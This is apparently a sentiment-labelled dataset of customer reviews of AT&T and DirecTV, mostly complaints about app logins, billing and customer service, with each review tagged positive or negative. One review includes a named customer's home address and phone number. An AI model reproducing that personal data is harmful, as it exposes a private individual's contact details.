Body,Sentiment
"Their attempt to make a fancy app is a total failure. The website does not allow me to login and the app is sometimes the same, doesn’t show all my accounts, etc",negative
Shame on you charging me more without asking me. How can you contractually add features or change my monthly plan without my permission?!!!!,negative
Every time I turn around at&t keeps raising my phone bill and I’m about done,negative
"First time in years we exceeded 1.5G data last month, at 10.5 per data usage summary, in one day!  But no one can prove it to me and I cannot access that data now.  As far as I can determine, it was fake so we would go unlimited.  Need to return to full transparency!  Think we need to attend next stockholders meeting or sell it off.",negative
Even the workers at the ATT store were unable to figure out how to get my password accepted.,negative
I have never actually talk to someone on chat they say it’s a very busy and they will get to you as soon as possible. My bill went up nine dollars. No wonder they don’t want to answer,negative
Not very good. 75% the time I can’t log in. My husband was told we can’t use WiFi to log in on the lap top! Other than that its been great service.,negative
The customer service was excellent helping for everything ??????,positive
AT&T is awesome!!!????????.,positive
"AT&T has started raising your bill under the guise of better service yet.. 5G e .. nothing but a marketing lie.  On top of that, they made terrible changes to the app.  And f you didn’t know. They are being sued for selling location services to bounty hunters.",negative
"With every merger update between att and directv, and every account/app change this company makes it more an more difficult to do the simplest things. 
I am a long term directv customer and att has made it a horrendous mess with bad customer service. I’m am very close to cutting the cord.",negative
"Half the time I open the app, it won’t load my info. The other half, it loads it incorrectly. 100% of the time, if I click any of the options once it does open, it times out or can’t open. I always hope things will be better with the next update but it never is.",negative
The WiFi Router provided by AT&T is CRAP - I am constantly hit with data charges even though the router indicates that it is on and fully functional. I am currently in the market for a more reliable service for me and all in my family group and extended network.,negative
At sign up I was told my 100.00 deposit wasn’t a deposit but the first 2 months of billing and I qualified for a $100.00 Visa card. Well a month later service was interrupted for non payment and no visa was ever added to be redeemed. Of course customer service has no idea and it’s pay or leave.,negative
Very bad app not friendly at all.,negative
"Very expensive for tv.  Been a direct TV fan for a lot of years but we are thinking of just going internet based tv.  $164.00 is too much a month for tv, no premium channels!",negative
This app froze during verification process. Surprising.,negative
"Just got two new phones by calling in and talked to Jonathan (in loyalty Dept). Ordered and received iPhone 7’s. Upgrades for us. Prices: $.99 and $99.99 with no activation fee. Thought, wow, what a deal for two 80 yr olds on fixed income. Well, now our bill shows waived activation fees reversed AND we are charged an access fee on each phone went from $25 to $40. So total bill went from $228 to $336. 
WOW! NOT A GOOD DEAL FOR TWO 89 yr OLDS ON FIXED INCOME. 
Hope we can rectify this problem. ??",negative
"Like ATT customer service, this app is terrible.  Most features don’t work and it always seems to be the one feature I need.",negative
This is the worst billing system I have ever been a part of. I hate it and can’t wait til this contact is up to get ride of you.,negative
"This app is by far the worst app I have ever tried to use. Most of the time it gets hung just trying to log in and I have to cancel and start over. It makes me change my password EVERY TIME because it tells me it’s the wrong password, even immediately after changing it and attempting to log in again. You would think a company that is supposedly technologically advanced could figure out how to make an app work correctly.",negative
"Says it sent code to my phone, never get one. Service was better years ago with Cingular...",negative
This app stopped working over two weeks ago. Ever time I call about it I get someone that doesn’t have a clue what I’m talking about. I guess I need to learn another language so I can find out how much data I have left. Been several more weeks and still can’t get it to work. This is just sad.,negative
Trying to log in on my cell and it won’t let me send verification code to my phone.,negative
"After setting up for a tech to come fix my internet, I’ve run into the worst customer service ever. 
I had a tech scheduled for Saturday between 8-12. Once 12:30 rolls around I have yet to see or hear from a tech. I contact ATT and I’m assured the tech is on the way and is about 20-30 minutes out. 2 HOURS later.... still no tech. So at 2:30 I contact ATT again, this time I am told there’s a tech 300 meters away checking the lines. Well that’s great, but my issue is the router not getting power. (This was stated at the initial contact which led to this scheduling). I go to the entrance of my subdivision where the ATT box is located and there’s no tech in site. I call again at 3 and hour phone call with ZERO people that speak English clear enough to understand, now I’m being told there’s no tech scheduled. After being on hold for 45 minutes to speak to a supervisor (again, doesn’t speak clear English) still no solution...",negative
"We-many of us in my area-George West, Tx have been having issues with our service for months. We have been without service, then told to use WiFi-this isn’t fair as we pay for service with AT&T. I have never received a credit for it. No I haven’t called-but we still have trouble to this day. You/AT&T really need to update the system in our area. 
Thanks",negative
"This is the most unreliable app I’ve ever had the misfortune of using.  
Completely frustrating most of the time.",negative
????????????????????????????????????????????????????????????????????????????????????????????????Worst customer service. Reps talk over you and circumvent the questions you ask. AT&T doesn’t care about their customers. They just collect money for their TRASH service. Dinosaur internet. POTATO WIFI.,negative
Spoke with Ben in call center and he head super helpful and kind. He took his time to explain the plan differences. He saved me from spending more for less!,positive
Will not update or tell me how much data I have used.,negative
Switching between statements cumbersome and the screen going blank is annoying when attempting to look at bills,negative
I love the AT&T app because I can pay my bill and manage my account quickly and easily!,positive
Changing our wireless plan without our consent,negative
Deleted and tried to reinstall several times and still not working. Failure every time you try to do anything. This app needs a major update.,negative
I do not like this,negative
"I swear, they charge you for ""free"" movies and take an hour to get you to rep that can help and have a horrible channel selection. If you have a choice, choose Comcast!!!!!!!",negative
Wow! Making a payment was super easy! Literally took me like 30 seconds.  Very cool.,positive
I am now paying more per month with no explanations. ??? What gives?,negative
Would give zero stars if I could.,negative
Very slow to responding.,negative
Extremely difficult to pay bills. ATT & Directv,negative
"If I log on to pay a bill - why are you asking me to take a survey ?????? 

Your timing is awful.  

Give me a break and don’t bother me.  

What good is me clicking a few random stars.  Who makes this survey garbage up? 

And I have a degree in social science.  Ask me about it and how I can focus the process and not be a nuisance.",negative
"Very annoying.. I have been trying to make a payment for more than two hours. Tried the phone and the app and still not able to make it. I was prompted to set up a new account and in that new account I was asked to link accounts. Each of those accounts has a user name and password that I had to enter or otherwise I would have to reset them. When I tried to reset them using the temporary passwords that At&t sent me by email, the system doesn’t recognize those password. Two hours later I  still can’t make the payment on the app and when I call the automated system would not recognize my key entered entries.. two hours and three  new accounts later I still haven’t made the payment.... can’t believe this is an app for one of the largest companies in the world. What a freaking mess!!",negative
"The application is not bad, but at@t customer service is horrible. I just paid my bill $239, and the application , after 5 days of my payment, shows additional $218. It was trying to charge my account but failed for some unknown reason.",negative
This service is terrible lately. I’m getting hit with ridiculous charges. My internet service is terrible and slow and most months my data usage is used up at the beginning of the cycle so our phones run so slow even when we’re using WiFi. Not at all happy with this service may be changing to a new one real soon. And I can’t even get a technician to chat with half the time!,negative
"It takes forever to open and then it only opens 
Into a notice and setting page. It will not open into account information. I have to open my old DTV APP. to get information about my bill. 
Please, just bring back the old DTV APP!!!",negative
Paid $50 to have my phone set up to call in the cruise.  Came home to a phone bill charged for usage totalling $185.  I did exactly as instructed when using the phone on the ship.  I def got screwed!,negative
AT&T makes it absolutely difficult to unlock your phone. I’ve been sending so many unlock requests but they are delaying n delaying.,negative
Terrible experience on phone with ATT and now useless app where I can’t find info on my insurance. :( Boo,negative
Haven’t been able to view anything other than my data usage on the app and same thing when I go to the website if this persists I might have to go elsewhere for my phone service. Trying to pay my bill and it’s just restarts and brings me back to data screen!!! Please help !! Will adjust rating if problem is fixed,negative
For months I have been trying to go online to update my billing address (a simple change of apartment number) and it keeps giving me a technical error message that this feature is temporarily down and will be fixed as soon as possible.  Unbelievable that some thing as simple as an address change can’t be done through their app because of their tech incompetence.,negative
The second time,negative
The bill amount shown each month on the app is never accurate. How am I suppose to trust autopay if I don’t know what possibly will be deducted each month?,negative
Many basic functions not working:(,negative
"I enjoy using the application; however, this updated version is not as good as the past version. It requires too much to get to the accounts and upon my signing in it asks me for my password several times despite me having Touch ID enabled. Using the app can be irritating at times.",negative
"It’s been a year, and this app always seems to have all kinds of errors and bugs. I’m on an iPhone XS Max, and half the time I can’t even make a payment cause it gets stuck on the load screen.

YOU HAVE HOW MUCH MONEY??? And you can’t even get your basic app to work properly?",negative
App hardly ever works,negative
"They system keep calculating my bill too soon, which makes my bill appear that there is a missed payment.",negative
"I called on the phone today to speak with someone about my bill, I received bad customer service. I was ask way to many questions and still didn’t receive what I needed. The customer service representative name was Tarse, she didn’t want to give me the correct spelling of her name and then she became very hesitant and still didn’t give me what I need she gave me a breakdown and it was still improper and still no pricing of I asked her several times what I needed!!! Very unhappy....",negative
"How can a company charge so much to so many people? Poor service, foreign customer service you can’t understand, the bill continue to increase, and The wait time on the phone is absurd. The phones are made as fragile as possible, with high insurance and deductibles, and what other device, that’s that small, costs an average between $700 and $1000 new?",negative
Such a bad example of cobbling together connectivity to multiple systems. UI is okay but the architecture and SSO is truly horrible. Have to reset my password EVERY time I log in because I have multiple ATT services and it can’t reconcile names and passwords although it tells me it can.,negative
Your customers service is tops. Your cell reception is not as good. We pay top dollar for our phones and I can't even use my phone at work. I work in Dupont center in St Augustine FL.  I'm to the point where I want to switch phone providers when our contract is over.,negative
"I can’t access my account to be able to make a payment, meanwhile time pass and my bill will be overdue, forcing me to pay a late fee. Two stars because the easiness of use when the app can function.",negative
"This review isn’t about the app. At&t has really gone downhill. They used to be the best but their service has really gone downhill. I only get alright service when I’m near downtown Denver. If I go outside that small area, my service gets very spotty. Changing to Verizon this year for sure.",negative
Very easy to navigate and it’s updated almost to the minute. Great app,positive
Good way to keep track of data. Easy to read,positive
"So today I tried to pay my AT&T account. Guess what - I can’t. Why? Because the account safety feature sends a text to a random phone on the account.

I set primary account for a reason, and it’s not so that I can be locked out of my account until I get a text from my daughter.",negative
"I used to get really good service and now I can only get one maybe two bars, and my calls fail constantly",negative
"The new update is horrible, completely horrible. 
But it’s AT&T so what was I thinking!!!!",negative
"MY ATT access to pay my bill is alway difficult. Your growth is interfering with customer ease f se and satisfaction. 

Spend some of your advertising budget on better performance for each customer that provides your company with success. 

May be time to get another carrier!",negative
Navigation is kind of funky and doesn’t work very well.  Crashes a lot.,negative
Where are my accounts? App only shows accounts I’ve cancelled.,negative
App doesn’t load half the time so it isn’t really convenient. AT&T has gone down hill a lot with bad service.,negative
Way overpriced,negative
Service is good but always place for improvement,positive
"This app has great features, but they never work.",negative
How about some real deals for loyal customers(10 years+)...once this provider lures you in there is no incentive stay except the hassle of transferring to a new provider...disappointing...why do I stay?!,negative
App takes way too long too load. I waited 15 minutes and it still did not load.,negative
"If I cannot schedule payments instead of date log in to APP.  I’ll start sending checks which has to create more work hours on your part, which is stupid. 
We travel and are out of country sometimes out of country during billing cycle.  If I could schedule payments to cover those times would be easier on us plus ATT. 

The trust factor isn’t good anyway.  I’ve had issues changing email address to new address.  Even with help of CSR. Now have all under one sign in with new address.  Except ATT UVerse. For some reason still get notification of bill due under old address. Which I’m ready to cancel. 
Here is another stupid reason why is nick name needed that keeps coming back because it’s already taken.",negative
"Customer service is a joke, they tell you one thing and when you get your bill it’s another story, don’t trust them and they have the worst service, your better off going with Dish or cable company. 

They don’t care about the customer, all they want to do is figure out how to give you the least service and how to charge way more then their service is worth. 

DO NOT GO WITH DIRECTV OR AT&T",negative
"This company combined my bill together with my wireless and internet. I did no t give permission or ask for this to be done. On top of that my bill increased $100 this month.  And the last agents I talked with did not decombine my account. Only for me to log into my
App and it says that I can’t see my wireless bill due to it being combined.   I want my bill to not be combined expeditiously.",negative
The app is not working here in Spain. It keeps asking me to try again in a few minutes (code L569). This has repeatedly occurred over the last two weeks. This occurs after I log in and it tells me I’m almost there and account info is being loaded. I’ve had to contact my son in the USA to access my account to check on AT&T international charges. It’s seems that they want to keep you guessing until they actually spring extra charges on your account.,negative
Muy conveniente y eficaz recomendable 100%,positive
It is such a pain to move from my TV account to my phone account. I really find it incredibly frustrating.,negative
"I ABSOLUTELY HATE, AND POSITIVELY DESPISE THE CURRENT AT&T WEBSITE. I GET TEXTS THAT SOMETHING IS DUE AND IF COURSE I WANT TO TAKE CARE IF IT however, SINCE I HAVE DIRECTTV, TELEPHONE AND DIGITAL LIFE.....AT&T doesn’t tell me which account it’s talking about. I go through their guessing game with error messages until I sick of it. I’ve called customer care ( which is a joke) and they want me to pay an additional $5.00 for a human!!!!!  So what gives?  Are they that broke that they need my $5.00???  
I am no longer under contract so just as soon as I can, I will be leaving AT&T forever!!!

L Williams
Rock Hill",negative
"For months now I cannot use my app because whenever I try to log in with my password it does the little spinning thinking thing until it says it times out. Used to be a good app, now completely useless",negative
AT&T has never had good customer service experience. I much money for only fair service.,negative
"Your app crashed on me, I can’t find out how much I owe on my iPhone.  Att has gone down hill over the last few years.  I’m thinking about switching to a different company.",negative
Too many updates and oversimplified. Rather see more options right on the loading page,negative
"AT&T showed up to my home and offer me a plan. I wanted to lower the cost of my cable, internet, and phone. I received my bill and this is twice the cost I was paying to WOE. I got rip off and I’m not happy with AT&T!",negative
"I have the worst times with this ap, loading is horrible, I can’t click on most things, takes forever to get things going! It’s so frustrating >.< at times the AP is down & I can’t pay my darn bill. It’s just dumb. 

I’ll give this ap 1 freaking star! Period. Once you make this ap better maybe I’ll give it two.",negative
"If I could give AT&T negative stars, I would. I have problems with no signal on my phone. No one can help me so I give this company one month to fix it, if not, I’m switching companies.",negative
"The app and your desk top application is embarrassing for you to be ATT  it is always broken and not working.

Your rates are too high and your tool and applications are terrible.

You have also destroyed direct tv with the worst customer service on the planets.

Att you should rebrand yourself a and hire non at home customer service ghetto agents.",negative
"Have not been able to get a correct bill for the last 5 months. Spent two and a half hours on a Saturday trying to get corrected and thought I did. Nope, error showed up on current invoice. Got to love ATT.",negative
"No way possible your 4.4 out of 5 is correct. Scam! Tried to spend money at AT&T, but guess what? I couldn’t because your lousy app don’t work. Couldn’t view updated options. WHAT A JOKE!  I guess with all the money AT&T makes, no big deal.",negative
"ATT is a ripoff, they offer you buy one phone get one free but the they keep forgetting to credit your account for the free one. I’m sure hoping you won’t catch it.",negative
"Love your app because it’s easy to maneuver,easy to read and gives you payment options.  I love it, wish other apps were as easy as this one to maneuver, oh well I can’t win them all lol 
Mrs Flores",positive
I try to reset and it locks says to send reminder and then locked again. Waste of time. And chat is offline.,negative
Worst service EVER,negative
I received a video message from AT&T stating i could login to my prepaid account on the my AT&T app.. after downloading the app I attempted to login. Every time i do the app redirects me to the web browser. Obviously i can not use the app for my at&t prepaid account.,negative
"Logging in has been an extremely infuriating hassle because a pop up shows stating that I apparently have the User ID wrong even after I received an automated message where the credentials were the same as what I typed in. I can’t buy anything within the app, which is still very laggy to navigate which I’m surprised at considering it’s 2019, because it says my cart is empty when I go to check out. I really can’t believe the website is better which isn’t saying much and there’s this push to install the app. Please fix these log in problems especially.",negative
This app is not good at all not user friendly,negative
Kicks me out constantly,negative
Non of the buttons work.  Can’t even get to my bill.,negative
"I constantly get frustrated with this app. It seems as though it is always freezing, stalling, moving slow or not updating account info.  I have had it over a period of several years and it has never improved. For a company that provides internet and smarts phones they are lacking.",negative
Every time I open the app it shows a blank white screen.,negative
Doesn’t work,negative
"Links don’t work most of the time and still having screen freezes, I have an iPhone 8plus so this shouldn’t be happening.",negative
"Because it always gets to the “Make a Payment” screen and then the button pushes, but nothing happens. 

Every. Single. Month.",negative
AT&T has been terrible. POOR service. No data.,negative
"Internet is slow.  
The ATT  app is impossible & ridiculous to use.   When I try to check internet data usage, it will not go to page, just sits there asleep and most times will kick me out  3 or 4 times.

One would think that a company as big as AT&T would be able to develop a website that would work properly.   10 out of ten times I have issues.   Never has it worked as it should in trying to check data usage.   We have limited usage so checking is of the upmost importance.

Another complaint is that due to the fact that usage is always  2 days behind I never know our total for the month.    I cannot see our totals except for 2 days before the end of the month. 

AND I have been told Uverse is 2 blocks from my house.  One agent told me last spring that I would have fiber optic probably by summer of 2018.     Still nothing and apparently no plans for it in my neighborhood.    Guess what something else is now close.   

Your prices are way to high for your service.   
Those are my thoughts.  Fortunately you no longer a monopoly.",negative
I swear the day I can log in to pay my bill and it shows the current month and not a weird previous month without me having to search high and low for the current bill will be the day we shut the service off!,negative
Don’t like this app can’t pay my bill,negative
"1) Logged in, password entered and the system continues to prompt me for a password. 
2) It's June 2019 and the app will only display my April bill. 
3) When I select view my bill it won't load. Phone signal is adequate to do so.",negative
App locks. Cannot complete desired objective,negative
"App constantly logs you out and forces you to log back in even when you use the remember me function. 

Proving your identity also makes no sense. When signing in you get a prompt to confirm you identity by text... on the same phone you’re using. Literally makes no sense. Just do a device registration",negative
This app never works right after my contract is up I’m moving on. This is how I pay my bill,negative
"I don’t know what updates occurred but my app no longer works. I try to log in using Facebook ID and it forces to to enter a password (yes, the password is correct because I can long on fine through my laptop), then it cycles like it’s going to access my account, then says login timed out. I tried removing and installing the app, same thing. I tried resetting my password, same thing. When I had access, before the login issues, it wouldn’t let me click to see or pay my bill. Fix your broken app",negative
Every month when I use the app to make a payment it acts up! Please get this fixed! Thanks,negative
I can’t get the app to work always have to login on my computer to pay my bill. I use to be able to do it from my phone. I have called into ATT but unsuccessful getting it to work.,negative
You failed to send a box for me to return the equipment. I’m not paying for that router all you need to do is mail me a box to return.,negative
Nothing will work. Everytime I click something it sees login timed out. I can’t even pay my bill.,negative
"I am looking for my end of contract date and it seems to be in a not logical place. 
Plus the app is sometimes so slow! 
My insurance company app puts these guys to shame!",negative
"I would like to be able to see my charges , once again I feel like I’m being over charged & am certainly seriously considering starting to look in a different direction for service",negative
"Not so hot, App doesn’t update very quickly, only every few days or so....
For a tech company you would think service would be much better!!",negative
App information does not match what I see on my PC,negative
App does not work and is confusing,negative
Unable to see my bill and the navigation is a little slow.,negative
"Since the most recent update of the app I cannot login. I enter my credentials, get the processing spinner, and an error message that states login timed out.",negative
They signyou up for paperless billing without your permission and make it virtually impossible to find out how to get off.,negative
"Can’t log in, server errors, hard to see Bill, very poorly designed app.",negative
Your app is pissing my off right now!!!!!!,negative
ATT makes appointments to come fix your internet then they don not show up or call. Worst data provider worst customer service I have ever seen,negative
"I recently just got a line with AT&T and was told to download this app and create a account. But the problem is I can’t even create a account because the stupid app pops up with a error message saying “sorry we could not process your request at this time, please try again” every time I get to the part where I create my security questions and it’s been doing this for the last day and a half as a new user I’m very irritated and annoyed at this point.",negative
Very good,positive
Sometimes it works and sometimes it doesn’t. It’s a pain in the butt when your Bill is die and you can’t sign into the app.,negative
"I have had DirecTV for years but since ATT bought it I have had nothing but trouble renting movies, trying to go online to pay my bill and getting any kind of help that actually helps. ?? 
And now I can’t send this review. Thanks ATT...NOT",negative
The app didn’t work at times,negative
Sometimes I have problems signing in. Just today It took me 3 times to get signed in. Didn’t recognize the password for 2 times and on the 3rd time signed me in,negative
Terrible App. Can’t retrieve any relevant information within a reasonable time,negative
"When going into the app, it hasn’t updated since May.",negative
I’m shocked to see +4 stars on this app. It NEVER works. I open and close it 3-4 times every month when I need to pay my bill. Also delete it and redownload every couple months.,negative
"Since the recent AT&T update I have had NOTHING but problems logging in. I’ve been a customer of AT&T for many, many years and this is the worst thing that’s ever happened!! Fix immediately before Verizon gets everybody’s business!!",negative
Terrible. The agent just stopped the chat once he heard my complaint over an amount billed of unauthorized charges.,negative
I have wasted nearly three hours trying to get I to my account to see a bill. I followed all of the  and reset my password four times. It’s stuck on an endless loop between telling me my account is locked and telling me to reset my password. Utterly ridiculous! ??,negative
Just get a different phone service. Don’t even waste your time,negative
The app works fine when you need information about your bill but seems to crash every time if you want to cancel your account or speak to someone.,negative
Absolute waist of a company that can’t even figure out how to start a new account with 3 phones. Nothing but a hassle and numerous hours on the phone and a week later still have 2 phones not activated nothing on my account is correct and nobody can fix it,negative
"Horrible customer service, your representatives lie to customers just to get them off the phone. AT&T is border line fraudulent this app does not work half the time trying to schedule payment arrangements.",negative
Cumbersome,negative
"I have talked to AT&T on the phone several times about an error in my bill after my recent move from TX to TN.  The bill still is wrong. I had 3 receivers in TX, in TN I only have 2. The third one was turned in at an UPS store along with other equipment. I have 2 TV’s now. 

I would appreciate it very much, if someone would correct my bill!

Linell Palo 
1172 Cavaletti Circle West, Gallatin, TN 37006

901-240-7221

My account is supposed to be bundled because I now have phone service, Directv, and internet.  Please check on that too.",negative
"I cancelled my service yet still was charged full amount because I was on autopay. Now I cannot seem to get a straight answer on 1) WHEN I will receive my reimbursement for the overcharge and 2) HOW to get my credit card information out of ATT’s system. 
After 45+ years as an ATT/ma bell customer, I am DONE! And their app and their website are absolutely worthless at getting any help or answers.
JUNK!",negative
"I’m waiting for over an hour, asking about a breakdown of the costs in my bill. I don’t know why I can’t get straight answers from reps.",negative
I have a problem with Direct Tv when you talk to a person and you get their name and you make changes that person doesn’t make the changes so when you call back nobody knows what’s happening so the problem was never solved their customer service is not very good at all I would not recommend Direct Tv if I could’ve given them a zero stars I would’ve given them zero stars,negative
It’s slow and unresponsive,negative
"Your logs are great, very helpful as well as your staff that answers questions and helps me out?????",positive
I wish it would show what it using all the data so I could delete the app that is using so much other than that it is working pretty good,positive
Cost to much!!,negative
"Not able to sign in, keep getting a “temporary system error” message.",negative
I was on the phone almost 2 hours to get an issue resolved! Customer service stinks and I will be finding a new provider!,negative
"For some reason every month my bill goes up started off paying 112 a month and then it went up to 145 a month now it’s over $200 , called several times and spoke to someone that could not get what I was trying to say gave me the runaround",negative
My plan included roaming in Canada and Mexico and this was changed without notifying me and thus I got stuck with roaming charges. TonVerizon as soon I can get there,negative
"Since the last update it doesn't work says to use web view for interstitial
Have to use my pc to pay",negative
The agent never replied to help me again!,negative
I called AT&T went we were no longer able to get NBC.  They were not able to tell me when the service would come back. They will not adjust our bill due to not getting us that channel . I’m. Wry is set . They are not keeping us informed on what is going on. Looking for new service now.,negative
"I manage our account. But two changes recently make managing the account much harder. First, we added a mobile device to the account for my wife, and second was AT&T added an extra layer of security, so now when I try to log in, it asks to send a code to my wife’s phone. This is not practical. The last agent said this is how it works, and said if I just use her phone one time to log in, then it will be fine. Not true. I used her phone to get the security code in the past, but here I am facing the same issue. What a joke of an app that it can’t send to MY phone, which is the primary phone on the account. So, the app doesn’t work for me and I’m giving it a one star.",negative
Doesn’t work half the time and makes me re sign in after using Face ID. Also shows current bill price but can’t view bill half the time just all around not user friendly at all.,negative
App is extremely slow.  I have iPhone XS and have trouble loading the app all the time.  Looks like they would be fast but att is the only app I have a problem with,negative
"No one can resolve technical issues that works for ATT. WAS on the phone 1 1/2 hours, switched to 6 people and no one could figure out how to fix the website issues.",negative
"Ever since the merger between direct tv and att it’s been such a task to just pay my bill thru this app! Horrible, and the best part is when you call for help your on the phone for an hour and get freakin no where because the people on the other line don’t know what they’re talking about.",negative
Mostly I just spend time tapping on the things that I want to see and this app just love tapping cause nothing happens and you just keep tapping. Waste of time and energy.,negative
You guys are too high and I could not understand the agent. Been with y’all for about 30 years it’s sad to see how att does their faithful customers. Very disappointed,negative
I can not get no answers for my questions I paid at apple all fees and still get charged again I will speak to someone and send them a copy thanks,negative
"They advised me to download this app and I’ve never been able to sign in. Even after a representative helped me, once I got through numerous password attempts, I received a prompt that said, Sorry, At this time, we are unable to access your account. Please try again later. 
So I called them...
What a mistake that was. 
“Can I verify this? Then that? Then this again?”
Wasted 20 minutes of my life and got no where but more irritated. 
Today I tried again. (Actually, I’ve tried several times)
Nope. Can’t access my account right now. 
Please try again later. 
I’m stuck in this contract until December. 
And trust me, the moment they set me free, I’ll be gone. 
Worst customer service. 
Worst app. 
Worst option when you are considering a cable company. 
Do yourself a favor, look elsewhere.",negative
"Price goes UP. Service gets worse. 
What’s not to enjoy?",negative
I’m getting so fed this unnecessary charges,negative
Love my phone an service,positive
"The app rarely ever works. My internet constantly gets disconnected from my phone. When I’m watching something recordered it will exit to live tv, and my genie mini cuts out at least 10x a day. So freaking frustrated with ATT as a whole. We are ready to drop every service we have with them.",negative
Att continues to have data missing in their reports. I spent 6 months trying to resolve with no fix.  ATT wants me to accurately pay my bills but cannot provide complete and accurate back up.,negative
Terrible pricing and bad customer service not recommended,negative
"You guys are terrible!
I am really upset at you guys for constantly telling me one thing and doing another!
Why do you keep raising my bill unnecessarily?
This is absolutely ignominious!",negative
I switched to ATT and it was a mistake.  Service is poor with the products and the customer service matches the poor products.  Switching back as soon as the agreement expires!! Don’t do business with ATT for anything!!,negative
I can’t find when my internet and phone contracts are over,negative
"My family had been a customer with AT&T since it’s transition from pacific Bell. We have never had any issues until... I had to cut out my home phone service, my U verse tv and I canceled one of my cell phones. Since this time I have had nothing but horrible service. I made a payment arrangement yet my service was still cut off. I inquired about this and coincidentally the transmission was deleted. I spoke to multiple representatives was given conflicting information. The last representative I spoke with admitted, on a recorded line that the previous representatives lied to me. I spoke with a manager who excused me of falsifying a request for a payment arrangement in order to have my phone service turned on without,
This was not true. I made the arrangement because I had to wait until I got paid at the end of the month, his name was Alan and he was incredibly rude. I asked him to do an investigation as to why transmissions were deleted and Alan stated “do you know all the forms I have to fill out to do this?” Suffice it to say I went to pay my bill and the AT&T store sales associate informed me they don’t accept coins (0.95.
After dealing with unhelpful representatives and being given the run around for 6 hours I was done at this point. I asked the sales associate how I was going to pay and she said “I don’t know, we don’t take payments here” o told her I made a payment last week and she said “well if the manager says so then I guess it’s ok” AT&T only cares about SELLING, SELLING, SELLING! And upgrading phones they no longer care about their customers at all. I have my cell phones under a few more months of a contract and when that is done I’m through with AT&T! ??",negative
no me gusta tener facturas conbinadas tendre que cancelar el internet,negative
"I get text alerts and emails stating my bill is one amount.  When I log in to the app, it states my amount due is $0.00 - every time.  Frustrating!",negative
Very expensive plans and rates and app freezes up more than it works,negative
"My bill has increased by $10. Prices for ATT services are notoriously expensive. I have internet, Directv, and cell and I don’t get a discount as a loyal customer. This is ridiculous!",negative
Never brings up acc details,negative
I had a bundle package with at&t internet and directv.  My bill would go up every year. So I would call and try to lower my bill.  Sometimes for the better sometimes not.  The last time was not.  I canceled the directv part of my bill in February.  It was 3 day past my billing cycle.  I did not know I would be charged for a whole month because I did not cancel 3 days earlier.  I DO NOT feel I owe this full amount.  I do agree that I owe for 3 days. So after call over and over again to get this straightened out I have not had any luck.  I have continued to pay my internet bill until it was disconnected on the 4th of June. So if you have a bundle package and you are not happy with one of the services you have it can affect all of your services .                 Not a customer any more,negative
Lately the app is not responding or taking too long to do it. Right now I’m trying to see my latest bill and nothing happens.,negative
"None of the options are working. It hangs up.
Kicks you out of the app.
Doesn’t show my bill statement.",negative
"Very unhappy with the service from AT&T. I am unable to send text messages or make calls when I am in buildings or in certain areas.

Customer service says one thing and does something totally different. 

If I am paying almost $300/month for service I should be able to send text messages and make phone calls from any and all buildings.

Switching to AT&T was the worste decision I ever made!!!!!!!",negative
I am locked out of the app and no one is helping me.  U Suk.,negative
The website as well as the mobile app often crash or are completely offline. Very disappointed.,negative
Makes life easier,positive
This is a easy and fast way to pay the bill.,positive
Easy and convenient,positive
"This new app is absolute garbage. The dashboard shows you nothing except an ad to add Direct Tv service. Ok, fine hit the menu and select let’s say billing and payments. It still shows me nothing. No data usage, due date, due amount, nothing. Matter fact, it doesn’t even seem to know what my payment method on file is (I have automatic payments set up). Once again this app does nothing. Waste of space. Fix it or get rid of it.",negative
I like it better when all I had to do is click on app flash face and takes me straight to account overview.  Instead of having to click here click there and click there too,negative
Slow buggy and incorrect data being displayed I downloaded to check my at&t wireless bill but only shows a direct tv trial I canceled 2 years ago still no clue about my phone bill thanks at&t,negative
Buggy and crashes a lot.,negative
"I was in the middle of the chat, waiting for over 10 minutes for an answer to find out The representative left without bothering to reach back to me.  Zero Star to AT&T",negative
"AT&T is the WORST in ALL areas. We have been loyal customers for 20+ years. NEVER have we had the problems with this company that we have recently had.  They use to be the best, and are now at the bottom of the bottom!  We have gotten the run around for over a month on why we can’t pull up our bill and pay it. When MOST companies have to chase down customers to pay their bill, we had to spend HOURS upon HOURS with their crappy excuse for tech support ppl. Those hours of our life we will NEVER get back. ???? One of the customer service reps that I got sent to, who was supposedly a manager, answered the call with a screaming kid in the back ground!  Come on AT&T, REALLY?  So unprofessional!  Our problems STILL aren’t fixed, and all we wanted to do was pay a stupid bill because it’s due!  You guys seriously need to get your crap together!! If you’re contemplating AT&T... RUN THE OTHER WAY!  They aren’t a good company for service, price, OR CUSTOMER SERVICE!",negative
